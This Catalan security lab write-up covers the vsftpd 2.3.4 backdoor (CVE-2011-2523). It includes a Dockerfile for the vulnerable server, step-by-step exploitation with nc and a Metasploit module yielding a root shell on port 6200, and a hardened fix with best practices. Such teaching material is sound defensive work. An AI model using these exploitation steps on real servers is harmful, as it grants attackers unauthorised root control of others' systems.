# Servei 5: vsftpd 2.3.4 - CVE-2011-2523 Backdoor

## Descripció Breu

vsftpd 2.3.4 conte un backdoor introduit maliciosament al codi font del servidor FTP. Quan un usuari intenta autenticar-se amb un nom d'usuari que conte el caracter ":)" (smiley), el servidor obre una shell de root al port 6200 sense cap autenticacio addicional. Aquest backdoor va ser introduit al repositori oficial de vsftpd el juliol de 2011 i va estar actiu durant uns dies fins que va ser descobert.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Shell root sense autenticacio permet acces a tot el sistema
- **Integritat** -> Control total del servidor per modificar qualsevol fitxer
- **Disponibilitat** -> Possible aturada o destruccio completa del sistema

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Critic |
| **CVE** | CVE-2011-2523 |
| **CVSS Score** | 10.0 (maxim) |
| **Versio afectada** | vsftpd 2.3.4 exclusivament |
| **Backdoor** | Login amb username que conte ":)" obre shell root al port 6200 |

---

## Implementació Vulnerable

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y wget build-essential libpam0g-dev

# Compilar vsftpd 2.3.4 amb el backdoor conegut
RUN wget https://security.appspot.com/downloads/vsftpd-2.3.4.tar.gz && \
    tar -xzf vsftpd-2.3.4.tar.gz && \
    cd vsftpd-2.3.4 && \
    make && cp vsftpd /usr/local/sbin/

EXPOSE 21
CMD ["/usr/local/sbin/vsftpd", "/etc/vsftpd.conf"]
```

### Verificació de la vulnerabilitat

```bash
# Identificar la versio vulnerable
nmap -sV -p 2121 localhost
# Output: 2121/tcp open ftp vsftpd 2.3.4

# Tambè detectable amb:
nc localhost 2121
# Output: 220 (vsFTPd 2.3.4)
```

---

## Com Explotar

### Pas 1: Identificar vsftpd 2.3.4
```bash
nmap -sV -p 2121 localhost
# Output: vsftpd 2.3.4

# O connectar directament
nc localhost 2121
# 220 (vsFTPd 2.3.4)
```

### Pas 2: Activar el backdoor
```bash
# Connectar al port FTP i enviar el trigger del backdoor
nc localhost 2121

# Enviar username amb ":)" al final
USER usuari:)
# Output: 331 Please specify the password.

PASS qualsevol
# El backdoor s'activa i obre el port 6200
```

### Pas 3: Connectar al port del backdoor
```bash
# En una altra terminal, connectar al port 6200
nc localhost 6200

# Shell root sense autenticacio
id
# uid=0(root) gid=0(root) groups=0(root)

whoami
# root
```

### Pas 4: Explotacio automatica amb Metasploit
```bash
# Metasploit te un modul especific per aquest backdoor
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS localhost
set RPORT 2121
run

# Output: Command shell session opened
# Shell root obtinguda
```

---

## Solució

Actualitzar a una versio de vsftpd sense el backdoor i aplicar configuracio segura:

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y vsftpd

RUN cat > /etc/vsftpd.conf << 'EOF'
listen=YES
anonymous_enable=NO
local_enable=YES
write_enable=NO
chroot_local_user=YES
ssl_enable=YES
force_local_data_ssl=YES
force_local_logins_ssl=YES
EOF
```

### Verificació de la correcció
```bash
# Identificar la versio corregida
nmap -sV -p 2122 localhost
# Output: vsftpd 3.0.x (sense backdoor)

# Intentar el trigger del backdoor
nc localhost 2122
USER usuari:)
PASS qualsevol
# Port 6200 no s'obre, backdoor no present

nc localhost 6200
# Output: Connection refused
```

---

## Bones Practiques

- Mai usar versions de software amb backdoors coneguts
- Verificar la integritat del codi font amb checksums SHA256 abans de compilar
- Usar repositoris oficials del sistema operatiu en lloc de binaris descarregats manualment
- Preferir SFTP sobre FTP per a transferencies xifrades
- Si cal FTP, usar FTPS (FTP sobre TLS) com a minim
- Revisar periodacament les versions amb Trivy o eines similars

---

## Referencies

- [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Metasploit Module vsftpd_234_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)
- [vsftpd Official Site](https://security.appspot.com/vsftpd.html)
- [SFTP vs FTP Security](https://www.ssh.com/academy/ssh/sftp)
